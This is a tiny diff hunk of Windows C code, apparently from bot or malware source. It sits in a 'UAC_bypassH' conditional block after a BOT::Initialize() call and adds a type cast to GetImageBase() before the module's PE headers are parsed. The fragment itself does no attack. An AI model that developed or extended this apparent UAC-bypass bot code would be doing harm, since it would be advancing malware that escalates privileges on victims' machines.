@@ -323,7 +323,7 @@ int APIENTRY MyMain()
 {
 	BOT::Initialize();   
 #ifdef UAC_bypassH
-	DWORD image = GetImageBase();
+	DWORD image = (DWORD)GetImageBase();
     PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
         ((PUCHAR)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
 	if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
